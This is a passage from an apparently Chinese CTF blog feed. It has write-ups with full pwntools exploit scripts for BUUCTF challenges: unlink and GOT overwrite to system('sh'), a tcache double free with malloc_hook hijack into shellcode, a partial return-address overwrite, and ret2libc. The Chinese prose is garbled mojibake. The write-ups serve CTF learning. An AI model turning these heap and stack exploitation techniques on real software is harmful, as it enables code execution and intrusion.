fd=0x6020d0-0x18bk=0x6020d0-0x10payload=p64(0)+p64(0x21)+p64(fd)+p64(bk)+p64(0x20)edit(1,payload) #6dele(2) #7 unlinkpayload=p64(0)+p64(elf.got[&#39;free&#39;])+p64(0)+p64(0x6020c0)+p32(1)+p32(1)+p32(1)edit(1,payload)  #8edit(2,p64(0x400760))edit(1,p64(0x602020))dele(2)#dele(2)p.recvuntil(&#39;2. Big secret&#39;)puts_addr=u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,&#39;\x00&#39;))print(hex(puts_addr))base=puts_addr-libc.sym[&#39;puts&#39;]system=base+libc.sym[&#39;system&#39;]payload=p64(elf.got[&#39;atoi&#39;])+p64(0)+p32(1)+p32(1)+p32(1)edit(1,payload)edit(2,p64(system))p.sendlineafter(&#39;3. Renew secret\n&#39;,&#39;sh\n&#39;)p.interactive()</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SWPUCTF_2019_p1KkHeap</title>
      <link href="/2023/10/29/SWPUCTF-2019-p1KkHeap/"/>
      <url>/2023/10/29/SWPUCTF-2019-p1KkHeap/</url>
      
        <content type="html"><![CDATA[<h5 id="æ‰€æœ‰æ“ä½œæ€»å…±é™åˆ¶åœ¨äº†0x12æ¬¡"><a href="#æ‰€æœ‰æ“ä½œæ€»å…±é™åˆ¶åœ¨äº†0x12æ¬¡" class="headerlink" title="æ‰€æœ‰æ“ä½œæ€»å…±é™åˆ¶åœ¨äº†0x12æ¬¡"></a>æ‰€æœ‰æ“ä½œæ€»å…±é™åˆ¶åœ¨äº†0x12æ¬¡</h5><p><img src="https://i0.imgs.ovh/2023/10/29/AV5dU.png" alt="image-20231029175834785"></p><h5 id="ä¿æŠ¤å…¨å¼€ï¼Œé™åˆ¶äº†å †çš„å¤§å°åœ¨0x100ï¼Œä¸èƒ½ç»•è¿‡tachebinæœºåˆ¶"><a href="#ä¿æŠ¤å…¨å¼€ï¼Œé™åˆ¶äº†å †çš„å¤§å°åœ¨0x100ï¼Œä¸èƒ½ç»•è¿‡tachebinæœºåˆ¶" class="headerlink" title="ä¿æŠ¤å…¨å¼€ï¼Œé™åˆ¶äº†å †çš„å¤§å°åœ¨0x100ï¼Œä¸èƒ½ç»•è¿‡tachebinæœºåˆ¶"></a>ä¿æŠ¤å…¨å¼€ï¼Œé™åˆ¶äº†å †çš„å¤§å°åœ¨0x100ï¼Œä¸èƒ½ç»•è¿‡tachebinæœºåˆ¶</h5><p><img src="https://i0.imgs.ovh/2023/10/29/AVjMs.png" alt="image-20231029175545040"></p><h5 id="deleæ—¶æ²¡æœ‰å°†bssæ®µä¸Šçš„å †æŒ‡é’ˆæ¸…é›¶ï¼Œå­˜åœ¨double-freeæ¼æ´"><a href="#deleæ—¶æ²¡æœ‰å°†bssæ®µä¸Šçš„å †æŒ‡é’ˆæ¸…é›¶ï¼Œå­˜åœ¨double-freeæ¼æ´" class="headerlink" title="deleæ—¶æ²¡æœ‰å°†bssæ®µä¸Šçš„å †æŒ‡é’ˆæ¸…é›¶ï¼Œå­˜åœ¨double freeæ¼æ´"></a>deleæ—¶æ²¡æœ‰å°†bssæ®µä¸Šçš„å †æŒ‡é’ˆæ¸…é›¶ï¼Œå­˜åœ¨double freeæ¼æ´</h5><p><img src="https://i0.imgs.ovh/2023/10/29/AV4uX.png" alt="image-20231029175653199"></p><h5 id="æœ€å¤šåªèƒ½ç”³è¯·8æ¬¡å †"><a href="#æœ€å¤šåªèƒ½ç”³è¯·8æ¬¡å †" class="headerlink" title="æœ€å¤šåªèƒ½ç”³è¯·8æ¬¡å †"></a>æœ€å¤šåªèƒ½ç”³è¯·8æ¬¡å †</h5><p><img src="https://i0.imgs.ovh/2023/10/29/AVdF0.png" alt="image-20231029175951307"></p><h5 id="æœ¬æƒ³æ³„éœ²å †çš„åœ°å€ç„¶åæ”¹sizeæ³„éœ²åœ°å€ï¼Œä½†æ˜¯æœ€åçš„deleä¼šæŠ¥é”™ï¼Œä¸çŸ¥é“ä»€ä¹ˆåŸå› ï¼Œè€Œä¸”ç”³è¯·çš„æ¬¡æ•°æ ¹æœ¬ä¸å¤Ÿç”¨ï¼Œæ‰€ä»¥è¿™ä¸ªæ–¹æ³•ä¸è¡Œã€‚"><a href="#æœ¬æƒ³æ³„éœ²å †çš„åœ°å€ç„¶åæ”¹sizeæ³„éœ²åœ°å€ï¼Œä½†æ˜¯æœ€åçš„deleä¼šæŠ¥é”™ï¼Œä¸çŸ¥é“ä»€ä¹ˆåŸå› ï¼Œè€Œä¸”ç”³è¯·çš„æ¬¡æ•°æ ¹æœ¬ä¸å¤Ÿç”¨ï¼Œæ‰€ä»¥è¿™ä¸ªæ–¹æ³•ä¸è¡Œã€‚" class="headerlink" title="æœ¬æƒ³æ³„éœ²å †çš„åœ°å€ç„¶åæ”¹sizeæ³„éœ²åœ°å€ï¼Œä½†æ˜¯æœ€åçš„deleä¼šæŠ¥é”™ï¼Œä¸çŸ¥é“ä»€ä¹ˆåŸå› ï¼Œè€Œä¸”ç”³è¯·çš„æ¬¡æ•°æ ¹æœ¬ä¸å¤Ÿç”¨ï¼Œæ‰€ä»¥è¿™ä¸ªæ–¹æ³•ä¸è¡Œã€‚"></a>æœ¬æƒ³æ³„éœ²å †çš„åœ°å€ç„¶åæ”¹sizeæ³„éœ²åœ°å€ï¼Œä½†æ˜¯æœ€åçš„deleä¼šæŠ¥é”™ï¼Œä¸çŸ¥é“ä»€ä¹ˆåŸå› ï¼Œè€Œä¸”ç”³è¯·çš„æ¬¡æ•°æ ¹æœ¬ä¸å¤Ÿç”¨ï¼Œæ‰€ä»¥è¿™ä¸ªæ–¹æ³•ä¸è¡Œã€‚</h5><pre><code class="lang-py">add(0x40) #0add(0x40) #1add(0x10) #2add(0x10) #3dele(0)dele(1)dele(0)show(0)p.recvuntil(&#39;content: &#39;)m0_addr=u64(p.recv(6).ljust(8,&#39;\x00&#39;))print(hex(m0_addr))#add(0x10,)add(0x40)edit(4,p64(m0_addr+0x50))add(0x40)add(0x40)add(0x40)payload=p64(0)*3+p64(0x421)edit(7,payload)</code></pre><p><img src="https://i0.imgs.ovh/2023/10/29/AVy8l.png" alt="image-20231029190203419"></p><h5 id="è¿™é‡Œlibc2-27æœ‰ä¸€ç§ç‰¹æ€§ï¼Œtcache-perthread-structç»“æ„ä½“åœ¨å †ä¸Šï¼Œé‡Šæ”¾åå¤§å°åœ¨0x20åˆ°0x410çš„å †çš„åœ°å€ä¼šæ”¾åœ¨å¼€å§‹çš„0x250çš„å †é‚£é‡Œï¼Œè¿™é‡Œé‡Šæ”¾äº†ä¸‰ä¸ªå †ï¼Œä»0x557386b4a010å¼€å§‹ï¼Œä»–æ˜¯å°ç«¯åºå­˜å‚¨æ”¾åˆ°äº†åè¾¹ï¼Œç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯0x10å¤§å°çš„å †çš„æ•°é‡ï¼Œç„¶åä¾æ¬¡æ˜¯0x20-æœ€å¤šæ”¾7ä¸ªï¼Œæ”¾å®Œå°±æ”¾fastbinå’Œunsortedbiné‡Œã€‚"><a href="#è¿™é‡Œlibc2-27æœ‰ä¸€ç§ç‰¹æ€§ï¼Œtcache-perthread-structç»“æ„ä½“åœ¨å †ä¸Šï¼Œé‡Šæ”¾åå¤§å°åœ¨0x20åˆ°0x410çš„å †çš„åœ°å€ä¼šæ”¾åœ¨å¼€å§‹çš„0x250çš„å †é‚£é‡Œï¼Œè¿™é‡Œé‡Šæ”¾äº†ä¸‰ä¸ªå †ï¼Œä»0x557386b4a010å¼€å§‹ï¼Œä»–æ˜¯å°ç«¯åºå­˜å‚¨æ”¾åˆ°äº†åè¾¹ï¼Œç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯0x10å¤§å°çš„å †çš„æ•°é‡ï¼Œç„¶åä¾æ¬¡æ˜¯0x20-æœ€å¤šæ”¾7ä¸ªï¼Œæ”¾å®Œå°±æ”¾fastbinå’Œunsortedbiné‡Œã€‚" class="headerlink" title="è¿™é‡Œlibc2.27æœ‰ä¸€ç§ç‰¹æ€§ï¼Œtcache_perthread_structç»“æ„ä½“åœ¨å †ä¸Šï¼Œé‡Šæ”¾åå¤§å°åœ¨0x20åˆ°0x410çš„å †çš„åœ°å€ä¼šæ”¾åœ¨å¼€å§‹çš„0x250çš„å †é‚£é‡Œï¼Œè¿™é‡Œé‡Šæ”¾äº†ä¸‰ä¸ªå †ï¼Œä»0x557386b4a010å¼€å§‹ï¼Œä»–æ˜¯å°ç«¯åºå­˜å‚¨æ”¾åˆ°äº†åè¾¹ï¼Œç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯0x10å¤§å°çš„å †çš„æ•°é‡ï¼Œç„¶åä¾æ¬¡æ˜¯0x20,æœ€å¤šæ”¾7ä¸ªï¼Œæ”¾å®Œå°±æ”¾fastbinå’Œunsortedbiné‡Œã€‚"></a>è¿™é‡Œlibc2.27æœ‰ä¸€ç§ç‰¹æ€§ï¼Œtcache_perthread_structç»“æ„ä½“åœ¨å †ä¸Šï¼Œé‡Šæ”¾åå¤§å°åœ¨0x20åˆ°0x410çš„å †çš„åœ°å€ä¼šæ”¾åœ¨å¼€å§‹çš„0x250çš„å †é‚£é‡Œï¼Œè¿™é‡Œé‡Šæ”¾äº†ä¸‰ä¸ªå †ï¼Œä»0x557386b4a010å¼€å§‹ï¼Œä»–æ˜¯å°ç«¯åºå­˜å‚¨æ”¾åˆ°äº†åè¾¹ï¼Œç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯0x10å¤§å°çš„å †çš„æ•°é‡ï¼Œç„¶åä¾æ¬¡æ˜¯0x20,æœ€å¤šæ”¾7ä¸ªï¼Œæ”¾å®Œå°±æ”¾fastbinå’Œunsortedbiné‡Œã€‚</h5><p><img src="https://i0.imgs.ovh/2023/10/29/ALhDX.png" alt="image-20231029203053580"></p><h5 id="åœ¨ä¸»å‡½æ•°é‡Œæœ‰ä¸€ä¸ªå‡½æ•°"><a href="#åœ¨ä¸»å‡½æ•°é‡Œæœ‰ä¸€ä¸ªå‡½æ•°" class="headerlink" title="åœ¨ä¸»å‡½æ•°é‡Œæœ‰ä¸€ä¸ªå‡½æ•°"></a>åœ¨ä¸»å‡½æ•°é‡Œæœ‰ä¸€ä¸ªå‡½æ•°</h5><p><img src="https://i0.imgs.ovh/2023/10/29/ALSVt.png" alt="image-20231029205210736"></p><h5 id="å®ƒæ˜ å°„äº†ä¸€ä¸ªåœ°å€åœ¨0x6666000ï¼Œé‚£ä¹ˆè¿™é“é¢˜å¾ˆæ˜æ˜¾ç”¨shellcodeå†™ï¼ŒæŠŠshellcodeå†™åœ¨è¿™ä¸ªåœ°å€ç„¶åæ‰§è¡Œ"><a href="#å®ƒæ˜ å°„äº†ä¸€ä¸ªåœ°å€åœ¨0x6666000ï¼Œé‚£ä¹ˆè¿™é“é¢˜å¾ˆæ˜æ˜¾ç”¨shellcodeå†™ï¼ŒæŠŠshellcodeå†™åœ¨è¿™ä¸ªåœ°å€ç„¶åæ‰§è¡Œ" class="headerlink" title="å®ƒæ˜ å°„äº†ä¸€ä¸ªåœ°å€åœ¨0x6666000ï¼Œé‚£ä¹ˆè¿™é“é¢˜å¾ˆæ˜æ˜¾ç”¨shellcodeå†™ï¼ŒæŠŠshellcodeå†™åœ¨è¿™ä¸ªåœ°å€ç„¶åæ‰§è¡Œ"></a>å®ƒæ˜ å°„äº†ä¸€ä¸ªåœ°å€åœ¨0x6666000ï¼Œé‚£ä¹ˆè¿™é“é¢˜å¾ˆæ˜æ˜¾ç”¨shellcodeå†™ï¼ŒæŠŠshellcodeå†™åœ¨è¿™ä¸ªåœ°å€ç„¶åæ‰§è¡Œ</h5><p><img src="https://i0.imgs.ovh/2023/10/29/ALukm.png" alt="image-20231029205237233"></p><h5 id="é¦–å…ˆå…ˆè®¡ç®—å‡ºtcache-perthread-structç»“æ„ä½“çš„åœ°å€ï¼Œè¿™é‡Œå¯ä»¥ç›´æ¥å¯¹ä¸€ä¸ªå †é‡Šæ”¾ä¸¤æ¬¡"><a href="#é¦–å…ˆå…ˆè®¡ç®—å‡ºtcache-perthread-structç»“æ„ä½“çš„åœ°å€ï¼Œè¿™é‡Œå¯ä»¥ç›´æ¥å¯¹ä¸€ä¸ªå †é‡Šæ”¾ä¸¤æ¬¡" class="headerlink" title="é¦–å…ˆå…ˆè®¡ç®—å‡ºtcache_perthread_structç»“æ„ä½“çš„åœ°å€ï¼Œè¿™é‡Œå¯ä»¥ç›´æ¥å¯¹ä¸€ä¸ªå †é‡Šæ”¾ä¸¤æ¬¡"></a>é¦–å…ˆå…ˆè®¡ç®—å‡ºtcache_perthread_structç»“æ„ä½“çš„åœ°å€ï¼Œè¿™é‡Œå¯ä»¥ç›´æ¥å¯¹ä¸€ä¸ªå †é‡Šæ”¾ä¸¤æ¬¡</h5><pre><code class="lang-py">add(0x100)add(0x100)dele(1)dele(1)show(1)p.recvuntil(&#39;content: &#39;)tache_addr=u64(p.recv(6).ljust(8,&#39;\x00&#39;))-0x360print(hex(tache_addr))</code></pre><h5 id="å†ç”³è¯·å †å°±èƒ½ç›´æ¥ä¿®æ”¹å †æŒ‡é’ˆ-æ”¹åˆ°tache-perthread-structå¼€å§‹çš„åœ°å€"><a href="#å†ç”³è¯·å †å°±èƒ½ç›´æ¥ä¿®æ”¹å †æŒ‡é’ˆ-æ”¹åˆ°tache-perthread-structå¼€å§‹çš„åœ°å€" class="headerlink" title="å†ç”³è¯·å †å°±èƒ½ç›´æ¥ä¿®æ”¹å †æŒ‡é’ˆ,æ”¹åˆ°tache_perthread_structå¼€å§‹çš„åœ°å€"></a>å†ç”³è¯·å †å°±èƒ½ç›´æ¥ä¿®æ”¹å †æŒ‡é’ˆ,æ”¹åˆ°tache_perthread_structå¼€å§‹çš„åœ°å€</h5><pre><code class="lang-py">add(0x100)  #2edit(2,p64(tache_addr))</code></pre><p><img src="https://i0.imgs.ovh/2023/10/29/ALONR.png" alt="image-20231029210730885"></p><h5 id="å†ç”³è¯·ä¸¤æ¬¡ï¼Œåœ¨tache-perthreadèƒ½æ”¹åˆ°ä¸‹é¢çš„åœ°å€-ç›¸å¯¹å¼€å§‹çš„åç§»æ˜¯0xc8-è¿™é‡Œä¸å¤ªæ¸…æ¥šä¸ºä»€ä¹ˆæ”¹åˆ°ä¸‹é¢çš„binæŒ‡é’ˆï¼Œåº”è¯¥å’Œå †ç®¡ç†å™¨æœ‰å…³"><a href="#å†ç”³è¯·ä¸¤æ¬¡ï¼Œåœ¨tache-perthreadèƒ½æ”¹åˆ°ä¸‹é¢çš„åœ°å€-ç›¸å¯¹å¼€å§‹çš„åç§»æ˜¯0xc8-è¿™é‡Œä¸å¤ªæ¸…æ¥šä¸ºä»€ä¹ˆæ”¹åˆ°ä¸‹é¢çš„binæŒ‡é’ˆï¼Œåº”è¯¥å’Œå †ç®¡ç†å™¨æœ‰å…³" class="headerlink" title="å†ç”³è¯·ä¸¤æ¬¡ï¼Œåœ¨tache_perthreadèƒ½æ”¹åˆ°ä¸‹é¢çš„åœ°å€,ç›¸å¯¹å¼€å§‹çš„åç§»æ˜¯0xc8,è¿™é‡Œä¸å¤ªæ¸…æ¥šä¸ºä»€ä¹ˆæ”¹åˆ°ä¸‹é¢çš„binæŒ‡é’ˆï¼Œåº”è¯¥å’Œå †ç®¡ç†å™¨æœ‰å…³"></a>å†ç”³è¯·ä¸¤æ¬¡ï¼Œåœ¨tache_perthreadèƒ½æ”¹åˆ°ä¸‹é¢çš„åœ°å€,ç›¸å¯¹å¼€å§‹çš„åç§»æ˜¯0xc8,è¿™é‡Œä¸å¤ªæ¸…æ¥šä¸ºä»€ä¹ˆæ”¹åˆ°ä¸‹é¢çš„binæŒ‡é’ˆï¼Œåº”è¯¥å’Œå †ç®¡ç†å™¨æœ‰å…³</h5><pre><code class="lang-py">add(0x100)  #3add(0x100)  #4vmmap=0x66660000edit(4,0xb8*&#39;\x00&#39;+p64(vmmap))</code></pre><p><img src="https://i0.imgs.ovh/2023/10/29/AL1xd.png" alt="image-20231029213256159"></p><h5 id="å†ç”³è¯·å †ï¼Œåœ¨0x66660000è¿™ä¸ªåœ°å€ä¸Šå†™ä¸Šshellcodeï¼Œè¿™é‡Œçœ‹åˆ°shellcodeçš„å¤§å°æ˜¯å¤§äº0x30çš„ï¼Œè‡³äºä¸ºä»€ä¹ˆåœ°å€æ˜¯0x66660300-å…¶å®åé¢æ”¹æˆshellcodeä»¥åçš„åœ°å€éƒ½å¯ä»¥ï¼Œæ¯”å¦‚0x66660040ä»¥å"><a href="#å†ç”³è¯·å †ï¼Œåœ¨0x66660000è¿™ä¸ªåœ°å€ä¸Šå†™ä¸Šshellcodeï¼Œè¿™é‡Œçœ‹åˆ°shellcodeçš„å¤§å°æ˜¯å¤§äº0x30çš„ï¼Œè‡³äºä¸ºä»€ä¹ˆåœ°å€æ˜¯0x66660300-å…¶å®åé¢æ”¹æˆshellcodeä»¥åçš„åœ°å€éƒ½å¯ä»¥ï¼Œæ¯”å¦‚0x66660040ä»¥å" class="headerlink" title="å†ç”³è¯·å †ï¼Œåœ¨0x66660000è¿™ä¸ªåœ°å€ä¸Šå†™ä¸Šshellcodeï¼Œè¿™é‡Œçœ‹åˆ°shellcodeçš„å¤§å°æ˜¯å¤§äº0x30çš„ï¼Œè‡³äºä¸ºä»€ä¹ˆåœ°å€æ˜¯0x66660300,å…¶å®åé¢æ”¹æˆshellcodeä»¥åçš„åœ°å€éƒ½å¯ä»¥ï¼Œæ¯”å¦‚0x66660040ä»¥å"></a>å†ç”³è¯·å †ï¼Œåœ¨0x66660000è¿™ä¸ªåœ°å€ä¸Šå†™ä¸Šshellcodeï¼Œè¿™é‡Œçœ‹åˆ°shellcodeçš„å¤§å°æ˜¯å¤§äº0x30çš„ï¼Œè‡³äºä¸ºä»€ä¹ˆåœ°å€æ˜¯0x66660300,å…¶å®åé¢æ”¹æˆshellcodeä»¥åçš„åœ°å€éƒ½å¯ä»¥ï¼Œæ¯”å¦‚0x66660040ä»¥å</h5><pre><code class="lang-py">add(0x100)  #5shellcode=shellcraft.open(&#39;flag&#39;,0)shellcode+=shellcraft.read(3,0x66660300,0x30)shellcode+=shellcraft.write(1,0x66660300,0x30)edit(5,shellcode)</code></pre><p><img src="https://i0.imgs.ovh/2023/10/29/ALEZe.png" alt="image-20231029214310944"></p><h5 id="å½“tache-perthreadçš„sizeä¸º0ä½†æ‰€å¯¹åº”çš„é¦–åœ°å€ä¸ä¸ºç©ºæ—¶ï¼Œå†åˆ†é…å‡ºå»sizeä¼šå˜æˆ0xffå¤§äº7ï¼Œå†dele-0-ä¼šæ”¾åœ¨unsortedbinï¼Œå› ä¸ºå¤§äº0x80ï¼Œæ­¤æ—¶å¯ä»¥æ³„éœ²main-arena-96çš„åœ°å€ï¼Œè¿™ä¸ªåœ°å€å‡0x70å°±æ˜¯malloc-hookçš„åœ°å€"><a href="#å½“tache-perthreadçš„sizeä¸º0ä½†æ‰€å¯¹åº”çš„é¦–åœ°å€ä¸ä¸ºç©ºæ—¶ï¼Œå†åˆ†é…å‡ºå»sizeä¼šå˜æˆ0xffå¤§äº7ï¼Œå†dele-0-ä¼šæ”¾åœ¨unsortedbinï¼Œå› ä¸ºå¤§äº0x80ï¼Œæ­¤æ—¶å¯ä»¥æ³„éœ²main-arena-96çš„åœ°å€ï¼Œè¿™ä¸ªåœ°å€å‡0x70å°±æ˜¯malloc-hookçš„åœ°å€" class="headerlink" title="å½“tache_perthreadçš„sizeä¸º0ä½†æ‰€å¯¹åº”çš„é¦–åœ°å€ä¸ä¸ºç©ºæ—¶ï¼Œå†åˆ†é…å‡ºå»sizeä¼šå˜æˆ0xffå¤§äº7ï¼Œå†dele(0)ä¼šæ”¾åœ¨unsortedbinï¼Œå› ä¸ºå¤§äº0x80ï¼Œæ­¤æ—¶å¯ä»¥æ³„éœ²main_arena+96çš„åœ°å€ï¼Œè¿™ä¸ªåœ°å€å‡0x70å°±æ˜¯malloc_hookçš„åœ°å€"></a>å½“tache_perthreadçš„sizeä¸º0ä½†æ‰€å¯¹åº”çš„é¦–åœ°å€ä¸ä¸ºç©ºæ—¶ï¼Œå†åˆ†é…å‡ºå»sizeä¼šå˜æˆ0xffå¤§äº7ï¼Œå†dele(0)ä¼šæ”¾åœ¨unsortedbinï¼Œå› ä¸ºå¤§äº0x80ï¼Œæ­¤æ—¶å¯ä»¥æ³„éœ²main_arena+96çš„åœ°å€ï¼Œè¿™ä¸ªåœ°å€å‡0x70å°±æ˜¯malloc_hookçš„åœ°å€</h5><pre><code class="lang-py">dele(0)show(0)p.recvuntil(&#39;content: &#39;)malloc_hook=u64(p.recv(6).ljust(8,&#39;\x00&#39;))-0x70print(hex(malloc_hook))</code></pre><p><img src="https://i0.imgs.ovh/2023/10/29/AXnaN.png" alt="image-20231029221645764"></p><h5 id="å†ä»¥ç›¸åŒçš„æ–¹å¼æ”¹æ‰tachebinçš„åœ°å€"><a href="#å†ä»¥ç›¸åŒçš„æ–¹å¼æ”¹æ‰tachebinçš„åœ°å€" class="headerlink" title="å†ä»¥ç›¸åŒçš„æ–¹å¼æ”¹æ‰tachebinçš„åœ°å€"></a>å†ä»¥ç›¸åŒçš„æ–¹å¼æ”¹æ‰tachebinçš„åœ°å€</h5><pre><code class="lang-py">edit(4,0xb8*&#39;\x00&#39;+p64(malloc_hook))</code></pre><p><img src="https://i0.imgs.ovh/2023/10/29/AXrKU.png" alt="image-20231029221302095"></p><h5 id="å†ç”³è¯·ä¸€æ¬¡0x100å¤§å°çš„å †ï¼Œeditå†…å®¹ä¸º0x66660000çš„åœ°å€ï¼Œå†ç”³è¯·ä¸€æ¬¡å †å³å¯ææƒ"><a href="#å†ç”³è¯·ä¸€æ¬¡0x100å¤§å°çš„å †ï¼Œeditå†…å®¹ä¸º0x66660000çš„åœ°å€ï¼Œå†ç”³è¯·ä¸€æ¬¡å †å³å¯ææƒ" class="headerlink" title="å†ç”³è¯·ä¸€æ¬¡0x100å¤§å°çš„å †ï¼Œeditå†…å®¹ä¸º0x66660000çš„åœ°å€ï¼Œå†ç”³è¯·ä¸€æ¬¡å †å³å¯ææƒ"></a>å†ç”³è¯·ä¸€æ¬¡0x100å¤§å°çš„å †ï¼Œeditå†…å®¹ä¸º0x66660000çš„åœ°å€ï¼Œå†ç”³è¯·ä¸€æ¬¡å †å³å¯ææƒ</h5><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="lang-py">from pwn import*from LibcSearcher import *#p=remote(&quot;node4.buuoj.cn&quot;,)p=process(&quot;./SWPUCTF_2019_p1KkHeap&quot;)context.update(arch=&#39;amd64&#39;, os=&#39;linux&#39;, endian=&#39;little&#39;)context.log_level=&quot;debug&quot;libc=ELF(&#39;./libc-2.27.so&#39;)def add(size):    p.sendlineafter(&#39;Your Choice: &#39;,&#39;1&#39;)    p.sendlineafter(&#39;size: &#39;,str(size))def show(index):    p.sendlineafter(&#39;Your Choice: &#39;,&#39;2&#39;)    p.sendlineafter(&#39;id: &#39;,str(index))def edit(index,content):    p.sendlineafter(&#39;Your Choice: &#39;,&#39;3&#39;)    p.sendlineafter(&#39;id: &#39;,str(index))    p.sendlineafter(&#39;content: &#39;,content)def dele(index):    p.sendlineafter(&#39;Your Choice: &#39;,&#39;4&#39;)    p.sendlineafter(&#39;id: &#39;,str(index))add(0x100)  #0add(0x100)  #1dele(1)dele(1)show(1)p.recvuntil(&#39;content: &#39;)tache_addr=u64(p.recv(6).ljust(8,&#39;\x00&#39;))-0x360print(hex(tache_addr))add(0x100)  #2edit(2,p64(tache_addr)*2)add(0x100)  #3add(0x100)  #4vmmap=0x66660000edit(4,0xb8*&#39;\x00&#39;+p64(vmmap))add(0x100)  #5shellcode=shellcraft.open(&#39;flag&#39;,0)shellcode+=shellcraft.read(3,0x66660300,0x30)shellcode+=shellcraft.write(1,0x66660300,0x30)edit(5,asm(shellcode))dele(0)show(0)p.recvuntil(&#39;content: &#39;)malloc_hook=u64(p.recv(6).ljust(8,&#39;\x00&#39;))-0x70print(hex(malloc_hook))#dele(0)edit(4,0xb8*&#39;\x00&#39;+p64(malloc_hook))add(0x100)  #6edit(6,p64(vmmap))add(0x100)gdb.attach(p)sleep(1)p.interactive()</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NewStar</title>
      <link href="/2023/10/25/NewStar/"/>
      <url>/2023/10/25/NewStar/</url>
      
        <content type="html"><![CDATA[<h2 id="p1eee"><a href="#p1eee" class="headerlink" title="p1eee"></a>p1eee</h2><h5 id="å¼€äº†pieä¿æŠ¤"><a href="#å¼€äº†pieä¿æŠ¤" class="headerlink" title="å¼€äº†pieä¿æŠ¤"></a>å¼€äº†pieä¿æŠ¤</h5><p><img src="https://i0.imgs.ovh/2023/10/25/F3cV5.png" alt="image-20231025205617591"></p><h5 id="å¯ä»¥æº¢å‡ºä¸€å­—èŠ‚"><a href="#å¯ä»¥æº¢å‡ºä¸€å­—èŠ‚" class="headerlink" title="å¯ä»¥æº¢å‡ºä¸€å­—èŠ‚"></a>å¯ä»¥æº¢å‡ºä¸€å­—èŠ‚</h5><p><img src="https://i0.imgs.ovh/2023/10/25/F3gtX.png" alt="image-20231025210358978"></p><h5 id="è¿˜æœ‰ä¸ªåé—¨å‡½æ•°"><a href="#è¿˜æœ‰ä¸ªåé—¨å‡½æ•°" class="headerlink" title="è¿˜æœ‰ä¸ªåé—¨å‡½æ•°"></a>è¿˜æœ‰ä¸ªåé—¨å‡½æ•°</h5><p><img src="https://i0.imgs.ovh/2023/10/25/F3eks.png" alt="image-20231025210337922"></p><p>å› ä¸ºä»£ç æ®µå’Œåé—¨å‡½æ•°åœ°å€ç›¸å·®æ˜¯éå¸¸è¿‘çš„ï¼Œåªå·®äº†ä¸€ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥è¦†ç›–è¿”å›åœ°å€ä¸ºåé—¨å‡½æ•°åœ°å€ï¼Œè¿”å›å‡½æ•°çš„åœ°å€ä¸€èˆ¬éƒ½æ˜¯move rbp ï¼Œrspä¹‹ç±»çš„ï¼Œæ‰€ä»¥è¿™é‡Œæœ€åä¸€å­—èŠ‚æ”¹æˆâ€™\x69â€™,æ”¹æˆä¹‹å‰çš„éƒ½ä¸è¡Œã€‚</p><p><img src="https://i0.imgs.ovh/2023/10/25/F3tNU.png" alt="image-20231025210604176"></p><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="lang-py">from pwn import*from LibcSearcher import *p=remote(&quot;node4.buuoj.cn&quot;,29807)#p=process(&quot;./pie&quot;)context.log_level=&quot;debug&quot;payload=&#39;a&#39;*(0x28)+&#39;\x69&#39;p.sendlineafter(&#39;A nice try to break pie!!!&#39;,payload)#gdb.attach(p)#sleep(1)#p.sendline(payload)p.interactive()</code></pre><h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><h5 id="å¸¸è§„çš„64ä½çš„ret2libcé¢˜"><a href="#å¸¸è§„çš„64ä½çš„ret2libcé¢˜" class="headerlink" title="å¸¸è§„çš„64ä½çš„ret2libcé¢˜"></a>å¸¸è§„çš„64ä½çš„ret2libcé¢˜</h5><p><img src="https://i0.imgs.ovh/2023/10/30/AAzet.png" alt="image-20231026223501750"></p><h5 id="åŒºåˆ«åœ¨äºæœ€åçš„payloadè¦åœ¨p64-binsh-åé¢åŠ ä¸ªretçš„å‚æ•°"><a href="#åŒºåˆ«åœ¨äºæœ€åçš„payloadè¦åœ¨p64-binsh-åé¢åŠ ä¸ªretçš„å‚æ•°" class="headerlink" title="åŒºåˆ«åœ¨äºæœ€åçš„payloadè¦åœ¨p64(binsh)åé¢åŠ ä¸ªretçš„å‚æ•°"></a>åŒºåˆ«åœ¨äºæœ€åçš„payloadè¦åœ¨p64(binsh)åé¢åŠ ä¸ªretçš„å‚æ•°</h5><pre><code class="lang-py">payload=&#39;a&#39;*0x28+p64(pop_rdi)+p64(binsh)+p64(ret)+p64(system)</code></pre><p><img src="https://i0.imgs.ovh/2023/10/30/AAUGm.png" alt="image-20231026223815671"></p><h5 id="libcçš„è¯write-upæ˜¯æ¨èæ‰‹åŠ¨è®¡ç®—ï¼Œä½†æ˜¯æ²¡ç»™å…·ä½“æ˜¯ä»€ä¹ˆç‰ˆæœ¬çš„libc-ç”¨é¢˜ç›®æœ¬èº«çš„ï¼Œç”¨buuè‡ªå¸¦æä¾›çš„libc-2-23-so-libc-2-27-soéƒ½æ˜¯æ‰“ä¸é€šçš„ã€‚"><a href="#libcçš„è¯write-upæ˜¯æ¨èæ‰‹åŠ¨è®¡ç®—ï¼Œä½†æ˜¯æ²¡ç»™å…·ä½“æ˜¯ä»€ä¹ˆç‰ˆæœ¬çš„libc-ç”¨é¢˜ç›®æœ¬èº«çš„ï¼Œç”¨buuè‡ªå¸¦æä¾›çš„libc-2-23-so-libc-2-27-soéƒ½æ˜¯æ‰“ä¸é€šçš„ã€‚" class="headerlink" 